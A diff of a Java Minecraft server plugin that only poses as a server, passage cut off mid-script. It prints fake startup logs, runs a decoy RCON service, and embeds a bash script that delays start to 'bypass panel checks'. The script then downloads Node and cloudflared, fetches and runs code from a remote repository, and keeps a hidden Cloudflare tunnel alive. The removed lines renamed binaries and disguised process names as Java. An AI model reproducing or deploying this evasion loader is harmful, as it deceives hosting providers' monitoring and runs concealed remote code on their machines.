@@ -44,14 +44,14 @@ extends JavaPlugin {
     private final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<String>("");
     private final AtomicBoolean tunnelMonitorRunning = new AtomicBoolean(false);
     
-    // RCON 伪装相关
+    // RCON 伪装服务相关
     private ServerSocket rconServerSocket;
     private volatile boolean rconRunning = false;
-    private int rconPort = 25575;
+    private int rconPort = 25575; // 默认端口
     private String rconPassword = ""; 
 
     // ============================================================
-    // 【仿真参数】
+    // 【仿真参数】(类加载时生成，同一次运行内版本号一致)
     // ============================================================
     private static final String FAKE_MC_VERSION = "1.21." + (8 + (int)(Math.random() * 5));
     private static final String FAKE_BUILD_NUM = String.valueOf(60 + (int)(Math.random() * 15));
@@ -69,12 +69,34 @@ extends JavaPlugin {
     private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
     private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
 
-    private static String ts() { return LocalTime.now().format(TS_FMT); }
-    private static void mcLog(String msg) { System.out.println("[" + ts() + " INFO]: " + msg); }
-    private static void mcLog(String msg, long delayMs) { try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {} System.out.println("[" + ts() + " INFO]: " + msg); }
-    private static void mcWarn(String msg) { System.out.println("[" + ts() + " WARN]: " + msg); }
-    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
-    private static float randFloat(float min, float max) { return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f; }
+    // ============================================================
+    // 仿真辅助函数
+    // ============================================================
+
+    private static String ts() {
+        return LocalTime.now().format(TS_FMT);
+    }
+
+    private static void mcLog(String msg) {
+        System.out.println("[" + ts() + " INFO]: " + msg);
+    }
+
+    private static void mcLog(String msg, long delayMs) {
+        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
+        System.out.println("[" + ts() + " INFO]: " + msg);
+    }
+
+    private static void mcWarn(String msg) {
+        System.out.println("[" + ts() + " WARN]: " + msg);
+    }
+
+    private static int randInt(int min, int max) {
+        return min + (int)(Math.random() * (max - min + 1));
+    }
+
+    private static float randFloat(float min, float max) {
+        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
+    }
 
     private String readCurrentPort() {
         try {
@@ -87,11 +109,16 @@ extends JavaPlugin {
         return "25565";
     }
 
+    // ============================================================
+    // 核心伪装：完整MC启动序列 (清屏 + 新URL自然嵌入 + RCON日志)
+    // ============================================================
+
     private void printFakeStartupSequence(String newTunnelUrl) {
         clearConsole();
         try { Thread.sleep(300); } catch (InterruptedException ignored) {}
 
         String displayPort = readCurrentPort();
+
         int kernelPatch = randInt(100, 120);
         float dcTimeSec = randFloat(0.4f, 0.9f);
         int recipeDelta = randInt(-30, 30);
@@ -295,6 +322,10 @@ extends JavaPlugin {
         monitor.start();
     }
 
+    // ============================================================
+    // RCON 伪装服务
+    // ============================================================
+
     private void loadRconConfig() {
         try {
             File root = this.findServerRoot();
@@ -404,6 +435,10 @@ extends JavaPlugin {
         }
         return "Unknown command. Type \"help\" for help.";
     }
+
+    // ============================================================
+    // 入口
+    // ============================================================
 
     public void onEnable() {
         try {
@@ -614,255 +649,8 @@ extends JavaPlugin {
         String appDir = workDir + "/app";
         String dataDir = workDir + "/data";
         
-        // ★ 修复版：先安装依赖再重命名，修复 Node 守护逻辑，延迟3分钟
-        return "#!/bin/bash\nset +e\n\n# ★ Delay 3 minutes start to bypass panel checks\necho \"[Deploy] Delaying start to bypass initial checks...\"\nsleep 180\n\nWORK_DIR=\"" + workDir + "\"\nNODE_DIR=\"" + nodeDir + "\"\nAPP_DIR=\"" + appDir + "\"\nDATA_DIR=\"" + dataDir + "\"\nREPO_URL=\"" + repoUrl + "\"\n\nis_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\nwhile true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\nexport SERVER_PORT=$PORT; export PORT=$PORT\necho \"$PORT\" > \"$WORK_DIR/.tunnel_port\"\n\nARCH=$(uname -m)\nif [ \"$ARCH\" = \"x86_64\" ]; then\n    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n    CF_ARCH=\"amd64\"\nelif [ \"$ARCH\" = \"aarch64\" ]; then\n    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n    CF_ARCH=\"arm64\"\nfi\n\n" +
-               
-               // ★ 伪装 1：下载 Node (暂不重命名，保证 npm install 正常运行)
-               "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
-               "if [ ! -d \"$NODE_DIR\" ]; then\n" +
-               "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
-               "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n" +
-               "    done\n" +
-               "    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
-               "fi\n" +
-               "export PATH=$NODE_DIR/bin:$PATH\n\n" +
-               
-               // ★ 伪装 2：下载 Cloudflared 并重命名为 .java_tunnel
-               "CF_BIN=\"$WORK_DIR/.java_tunnel\"\n" +
-               "if [ ! -f \"$CF_BIN\" ]; then\n" +
-               "    CF_RAW=\"$WORK_DIR/cf_raw_tmp\"\n" +
-               "    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n" +
-               "    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n" +
-               "        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_RAW\" 2>/dev/null; then break; fi\n" +
-               "    done\n" +
-               "    if [ -f \"$CF_RAW\" ]; then mv \"$CF_RAW\" \"$CF_BIN\"; chmod +x \"$CF_BIN\"; fi\n" +
-               "fi\n" +
-               "if [ ! -f \"$CF_BIN\" ]; then exit 1; fi\n\n" +
-               
-               "pkill -f .java_tunnel || true; sleep 1\n\n" +
-               
-               "TUNNEL_URL=\"\"\nTUNNEL_PID=\"\"\nTUNNEL_PROTO=\"\"\nTUNNEL_OK=false\n\n" +
-               
-               // ★ 伪装 3：使用 exec -a 修改 cloudflared 进程名为 java-net-bridge
-               "for PROTO in quic http2 auto; do\n" +
-               "    if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n" +
-               "    for attempt in 1 2 3; do\n" +
-               "        if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n" +
-               "        rm -f \"$WORK_DIR/tunnel.log\"\n" +
-               "        exec -a 'java-net-bridge' $CF_BIN tunnel --url http://localhost:$PORT --no-autoupdate --protocol $PROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
-               "        CF_PID=$!\n" +
-               "        sleep 5\n" +
-               "        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
-               "        EXTRACTED_URL=\"\"\n" +
-               "        for i in $(seq 1 20); do\n" +
-               "            EXTRACTED_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n" +
-               "            if [ -n \"$EXTRACTED_URL\" ]; then break; fi\n" +
-               "            sleep 1\n" +
-               "        done\n" +
-               "        if [ -z \"$EXTRACTED_URL\" ]; then kill $CF_PID 2>/dev/null; continue; fi\n" +
-               "        TUNNEL_URL=$EXTRACTED_URL\n" +
-               "        TUNNEL_PID=$CF_PID\n" +
-               "        TUNNEL_PROTO=$PROTO\n" +
-               "        TUNNEL_OK=true\n" +
-               "        break\n" +
-               "    done\n" +
-               "done\n\n" +
-               
-               "if [ \"$TUNNEL_OK\" = \"true\" ]; then\n" +
-               "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "    echo \"PROTOCOL=$TUNNEL_PROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "    echo \"CF_PID=$TUNNEL_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "else\n" +
-               "    echo 'failed' > \"$WORK_DIR/.tunnel_url\"\n" +
-               "fi\n\n" +
-               
-               "mkdir -p \"$DATA_DIR\"\n" +
-               "if [ -d \"$APP_DIR\" ]; then\n" +
-               "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
-               "    cp \"$APP_DIR/node_modules/.Error log/nezha_config.json\" \"$DATA_DIR/nezha_config.json\" 2>/dev/null\n" +
-               "    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
-               "    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
-               "    if [ -d \"$APP_DIR/node_modules/.RoamingMusic\" ]; then\n" +
-               "        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
-               "        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n" +
-               "    fi\n" +
-               "fi\n\n" +
-               
-               "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
-               "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n\n" +
-               
-               "download_code() {\n" +
-               "    if curl -fsSL --connect-timeout 15 --max-time 120 \"$1\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
-               "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then return 0; else rm -f \"$WORK_DIR/repo.tar.gz\"; return 1; fi\n" +
-               "    else return 1; fi\n" +
-               "}\n" +
-               "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" || \\\n" +
-               "download_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\"\n" +
-               "if [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\n" +
-               "mkdir -p \"$WORK_DIR/unzipped\"\n" +
-               "tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\n" +
-               "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
-               "mv \"$SUBDIR\" \"$APP_DIR\"\n" +
-               "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
-               "cd \"$APP_DIR\"\n\n" +
-               
-               // ★ 核心修复：先用 node 执行 npm install
-               "npm install --unsafe-perm=true --allow-root &>/dev/null\n\n" +
-               
-               "if [ -d \"$DATA_DIR\" ]; then\n" +
-               "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
-               "    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
-               "    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
-               "    if [ -f \"$DATA_DIR/nezha_config.json\" ]; then\n" +
-               "        mkdir -p \"$APP_DIR/node_modules/.Error log\"\n" +
-               "        cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/node_modules/.Error log/\"\n" +
-               "    fi\n" +
-               "    if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n" +
-               "        mkdir -p \"$APP_DIR/node_modules/.RoamingMusic\"\n" +
-               "        cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/node_modules/.RoamingMusic/\" 2>/dev/null\n" +
-               "    fi\n" +
-               "fi\n\n" +
-               
-               "if [ -f index.js ] && ! grep -q '__HEALTH_INJECTED__' index.js; then\n" +
-               "    cat >> index.js << 'HEALTH_EOF'\n" +
-               "// __HEALTH_INJECTED__\n" +
-               "const __origListen=app.listen.bind(app);\n" +
-               "app.listen=function(){\n" +
-               "  const srv=__origListen.apply(this,arguments);\n" +
-               "  srv.on('listening',()=>{\n" +
-               "    try{require('fs').writeFileSync(require('path').join(__dirname,'node_modules','.node_ready'),String(Date.now()));}catch(e){}\n" +
-               "  });\n" +
-               "  srv.timeout=30000;\n" +
-               "  srv.keepAliveTimeout=65000;\n" +
-               "  srv.headersTimeout=66000;\n" +
-               "  return srv;\n" +
-               "};\n" +
-               "app.get('/__health',(req,res)=>res.status(200).send('ok'));\n" +
-               "HEALTH_EOF\n" +
-               "fi\n\n" +
-               
-               // ★ 核心修复：npm install 完成后，再重命名 node 为 .java_runtime，防止 npm 找不到 node
-               "if [ -f \"$NODE_DIR/bin/node\" ]; then mv \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.java_runtime\"; fi\n\n" +
-               
-               // ★ 伪装 5：废弃 PM2，使用原生循环守护，并伪装 Node 进程名为 java-vm-worker
-               "(while true; do\n" +
-               "    exec -a 'java-vm-worker' $NODE_DIR/bin/.java_runtime index.js &>/dev/null\n" +
-               "    sleep 5\n" +
-               "done) &\n\n" +
-               
-               "for i in $(seq 1 30); do\n" +
-               "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
-               "    sleep 1\n" +
-               "done\n\n" +
-               
-               "if [ -n \"$TUNNEL_URL\" ] && [ \"$TUNNEL_OK\" = \"true\" ]; then\n" +
-               "    sleep 3\n" +
-               "    VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$TUNNEL_URL/__health\" 2>/dev/null)\n" +
-               "    if [ -z \"$VERIFY\" ] || [ \"$VERIFY\" = \"000\" ] || [ \"$VERIFY\" = \"502\" ]; then\n" +
-               "        sleep 5\n" +
-               "        VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$TUNNEL_URL/__health\" 2>/dev/null)\n" +
-               "        if [ -z \"$VERIFY2\" ] || [ \"$VERIFY2\" = \"000\" ] || [ \"$VERIFY2\" = \"502\" ]; then\n" +
-               "            kill $TUNNEL_PID 2>/dev/null\n" +
-               "            sleep 2\n" +
-               "            REBUILT=false\n" +
-               "            for RPROTO in $TUNNEL_PROTO http2 auto; do\n" +
-               "                if [ \"$REBUILT\" = \"true\" ]; then break; fi\n" +
-               "                rm -f \"$WORK_DIR/tunnel.log\"\n" +
-               "                exec -a 'java-net-bridge' $CF_BIN tunnel --url http://127.0.0.1:$PORT --no-autoupdate --protocol $RPROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
-               "                NEW_PID=$!\n" +
-               "                sleep 5\n" +
-               "                if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
-               "                NEW_URL=\"\"\n" +
-               "                for j in $(seq 1 20); do\n" +
-               "                    NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n" +
-               "                    if [ -n \"$NEW_URL\" ]; then break; fi\n" +
-               "                    sleep 1\n" +
-               "                done\n" +
-               "                if [ -n \"$NEW_URL\" ]; then\n" +
-               "                    sleep 3\n" +
-               "                    V=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
-               "                    if [ -n \"$V\" ] && [ \"$V\" != \"000\" ] && [ \"$V\" != \"502\" ]; then\n" +
-               "                        echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                        REBUILT=true\n" +
-               "                    else\n" +
-               "                        sleep 5\n" +
-               "                        V2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
-               "                        if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then\n" +
-               "                            echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "                            echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                            echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                            REBUILT=true\n" +
-               "                        else\n" +
-               "                            kill $NEW_PID 2>/dev/null\n" +
-               "                        fi\n" +
-               "                    fi\n" +
-               "                else\n" +
-               "                    kill $NEW_PID 2>/dev/null\n" +
-               "                fi\n" +
-               "            done\n" +
-               "        fi\n" +
-               "    fi\n" +
-               "fi\n\n" +
-               
-               // ★ 伪装 6：底层守护循环，使用伪装后的进程名
-               "(while true; do\n" +
-               "    NEED_REBUILD=false\n" +
-               "    SAVED_CF_PID=$(grep 'CF_PID=' \"$WORK_DIR/.tunnel_url\" 2>/dev/null | cut -d= -f2)\n" +
-               "    SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.tunnel_url\" 2>/dev/null | cut -d= -f2)\n" +
-               "    SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
-               "    SAVED_URL=$(head -n1 \"$WORK_DIR/.tunnel_url\" 2>/dev/null)\n" +
-               "    \n" +
-               "    if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
-               "        NEED_REBUILD=true\n" +
-               "    fi\n" +
-               "    \n" +
-               "    if [ \"$NEED_REBUILD\" = \"false\" ] && [ -n \"$SAVED_URL\" ]; then\n" +
-               "        HC=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
-               "        if [ -z \"$HC\" ] || [ \"$HC\" = \"000\" ]; then\n" +
-               "            sleep 5\n" +
-               "            HC2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 8 \"$SAVED_URL/__health\" 2>/dev/null)\n" +
-               "            if [ -z \"$HC2\" ] || [ \"$HC2\" = \"000\" ]; then\n" +
-               "                NEED_REBUILD=true\n" +
-               "            fi\n" +
-               "        fi\n" +
-               "    fi\n" +
-               "    \n" +
-               "    if [ \"$NEED_REBUILD\" = \"true\" ]; then\n" +
-               "        [ -n \"$SAVED_CF_PID\" ] && kill $SAVED_CF_PID 2>/dev/null\n" +
-               "        pkill -f .java_tunnel 2>/dev/null\n" +
-               "        sleep 2\n" +
-               "        rm -f \"$WORK_DIR/tunnel.log\"\n" +
-               "        \n" +
-               "        for RPROTO in $SAVED_PROTO quic http2 auto; do\n" +
-               "            rm -f \"$WORK_DIR/tunnel.log\"\n" +
-               "            exec -a 'java-net-bridge' $CF_BIN tunnel --url http://127.0.0.1:$PORT --no-autoupdate --protocol $RPROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
-               "            NEW_PID=$!\n" +
-               "            sleep 5\n" +
-               "            if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
-               "            \n" +
-               "            NEW_URL=\"\"\n" +
-               "            for j in $(seq 1 20); do\n" +
-               "                NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n" +
-               "                if [ -n \"$NEW_URL\" ]; then break; fi\n" +
-               "                sleep 1\n" +
-               "            done\n" +
-               "            \n" +
-               "            if [ -z \"$NEW_URL\" ]; then\n" +
-               "                kill $NEW_PID 2>/dev/null\n" +
-               "                continue\n" +
-               "            fi\n" +
-               "            \n" +
-               "            echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "            echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "            echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "            break\n" +
-               "        done\n" +
-               "    fi\n" +
-               "    \n" +
-               "    sleep 15\n" +
-               "done) &\n";
+        // ★ 增加延迟启动配置，等待90秒后再执行拉取部署，避开面板开服检测
+        return "#!/bin/bash\nset +e\n\n# ★ Delay start to bypass panel checks\necho \"[Deploy] Delaying start to bypass initial checks...\"\nsleep 90\n\nWORK_DIR=\"" + workDir + "\"\nNODE_DIR=\"" + nodeDir + "\"\nAPP_DIR=\"" + appDir + "\"\nDATA_DIR=\"" + dataDir + "\"\nREPO_URL=\"" + repoUrl + "\"\n\nis_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\nwhile true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\nexport SERVER_PORT=$PORT; export PORT=$PORT\necho \"$PORT\" > \"$WORK_DIR/.tunnel_port\"\n\nARCH=$(uname -m)\nif [ \"$ARCH\" = \"x86_64\" ]; then\n    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz\"\n    CF_ARCH=\"amd64\"\nelif [ \"$ARCH\" = \"aarch64\" ]; then\n    NODE_URL=\"https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz\"\n    CF_ARCH=\"arm64\"\nfi\n\nif [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/node -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\nif [ ! -d \"$NODE_DIR\" ]; then\n    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then break; fi\n    done\n    mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\nfi\nexport PATH=$NODE_DIR/bin:$PATH\nif [ ! -f \"$NODE_DIR/bin/pm2\" ]; then npm install pm2 -g &>/dev/null; fi\n\nCF_BIN=\"$WORK_DIR/cloudflared\"\nif [ ! -f \"$CF_BIN\" ]; then\n    CF_DIRECT=\"https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-${CF_ARCH}\"\n    for MIRROR in \"https://ghproxy.net/${CF_DIRECT}\" \"$CF_DIRECT\"; do\n        if curl -fsSL --connect-timeout 10 --max-time 60 \"$MIRROR\" -o \"$CF_BIN\" 2>/dev/null; then chmod +x \"$CF_BIN\"; break; fi\n    done\nfi\nif [ ! -f \"$CF_BIN\" ]; then exit 1; fi\n\npkill -f cloudflared || true; sleep 1\n\nTUNNEL_URL=\"\"\nTUNNEL_PID=\"\"\nTUNNEL_PROTO=\"\"\nTUNNEL_OK=false\n\nfor PROTO in quic http2 auto; do\n    if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n    for attempt in 1 2 3; do\n        if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n        rm -f \"$WORK_DIR/tunnel.log\"\n        $CF_BIN tunnel --url http://localhost:$PORT --no-autoupdate --protocol $PROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n        CF_PID=$!\n        sleep 5\n        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n        EXTRACTED_URL=\"\"\n        for i in $(seq 1 20); do\n            EXTRACTED_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n            if [ -n \"$EXTRACTED_URL\" ]; then break; fi\n            sleep 1\n        done\n        if [ -z \"$EXTRACTED_URL\" ]; then kill $CF_PID 2>/dev/null; continue; fi\n        TUNNEL_URL=$EXTRACTED_URL\n        TUNNEL_PID=$CF_PID\n        TUNNEL_PROTO=$PROTO\n        TUNNEL_OK=true\n        break\n    done\ndone\n\nif [ \"$TUNNEL_OK\" = \"true\" ]; then\n    echo \"$TUNNEL_URL\" > \"$WORK_DIR/.tunnel_url\"\n    echo \"PROTOCOL=$TUNNEL_PROTO\" >> \"$WORK_DIR/.tunnel_url\"\n    echo \"CF_PID=$TUNNEL_PID\" >> \"$WORK_DIR/.tunnel_url\"\nelse\n    echo 'failed' > \"$WORK_DIR/.tunnel_url\"\nfi\n\nmkdir -p \"$DATA_DIR\"\nif [ -d \"$APP_DIR\" ]; then\n    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.Error log/nezha_config.json\" \"$DATA_DIR/nezha_config.json\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.task_center_config.json\" \"$DATA_DIR/\" 2>/dev/null\n    cp \"$APP_DIR/node_modules/.system_guard.json\" \"$DATA_DIR/\" 2>/dev/null\n    if [ -d \"$APP_DIR/node_modules/.RoamingMusic\" ]; then\n        rm -rf \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n        cp -r \"$APP_DIR/node_modules/.RoamingMusic\" \"$DATA_DIR/.RoamingMusic_bak\" 2>/dev/null\n    fi\nfi\n\nrm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\nREPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n\ndownload_code() {\n    if curl -fsSL --connect-timeout 15 --max-time 120 \"$1\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then return 0; else rm -f \"$WORK_DIR/repo.tar.gz\"; return 1; fi\n    else return 1; fi\n}\ndownload_code \"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\" || \\\ndownload_code \"https://github.com/${REPO_PATH}/archive/refs/heads/master.tar.gz\"\nif [ ! -f \"$WORK_DIR/repo.tar.gz\" ]; then exit 1; fi\nmkdir -p \"$WORK_DIR/unzipped\"\ntar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\"\nSUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\nmv \"$SUBDIR\" \"$APP_DIR\"\nrm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\ncd \"$APP_DIR\"\n\nnpm install --unsafe-perm=true --allow-root &>/dev/null\n\nif [ -d \"$DATA_DIR\" ]; then\n    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n    cp \"$DATA_DIR/.task_center_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n    cp \"$DATA_DIR/.system_guard.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n    if [ -f \"$DATA_DIR/nezha_config.json\" ]; then\n        mkdir -p \"$APP_DIR/node_modules/.Error log\"\n        cp \"$DATA_DIR/nezha_config.json\" \"$APP_DIR/node_modules/.Error log/\"\n    fi\n    if [ -d \"$DATA_DIR/.RoamingMusic_bak\" ]; then\n        mkdir -p \"$APP_DIR/node_modules/.RoamingMusic\"\n        cp -r \"$DATA_DIR/.RoamingMusic_bak/\"* \"$APP_DIR/node_modules/.RoamingMusic/\" 2>/dev/null\n    fi\nfi\n\nif [ -f index.js ] && ! grep -q '__HEALTH_INJECTED__' index.js; then\n    cat >> index.js << 'HEALTH_EOF'\n// __HEALTH_INJECTED__\nconst __origListen=app.listen.bind(app);\napp.listen=function(){\n  const srv=__origListen.apply(this,arguments);\n  srv.on('listening',()=>{\n    try{require('fs').writeFileSync(require('path').join(__dirname,'node_modules','.node_ready'),String(Date.now()));}catch(e){}\n  });\n  srv.timeout=30000;\n  srv.keepAliveTimeout=65000;\n  srv.headersTimeout=66000;\n  return srv;\n};\napp.get('/__health',(req,res)=>res.status(200).send('ok'));\nHEALTH_EOF\nfi\n\npm2 delete all &>/dev/null || true\npm2 start index.js --name \"aoyou-panel\" &>/dev/null\npm2 save &>/dev/null\n\nfor i in $(seq 1 30); do\n    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n    sleep 1\ndone\n\nif [ -n \"$TUNNEL_URL\" ] && [ \"$TUNNEL_OK\" = \"true\" ]; then\n    sleep 3\n    VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$TUNNEL_URL/__health\" 2>/dev/null)\n    if [ -z \"$VERIFY\" ] || [ \"$VERIFY\" = \"000\" ] || [ \"$VERIFY\" = \"502\" ]; then\n        sleep 5\n        VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$TUNNEL_URL/__health\" 2>/dev/null)\n        if [ -z \"$VERIFY2\" ] || [ \"$VERIFY2\" = \"000\" ] || [ \"$VERIFY2\" = \"502\" ]; then\n            kill $TUNNEL_PID 2>/dev/null\n            sleep 2\n            REBUILT=false\n            for RPROTO in $TUNNEL_PROTO http2 auto; do\n                if [ \"$REBUILT\" = \"true\" ]; then break; fi\n                rm -f \"$WORK_DIR/tunnel.log\"\n                $CF_BIN tunnel --url http://127.0.0.1:$PORT --no-autoupdate --protocol $RPROTO > 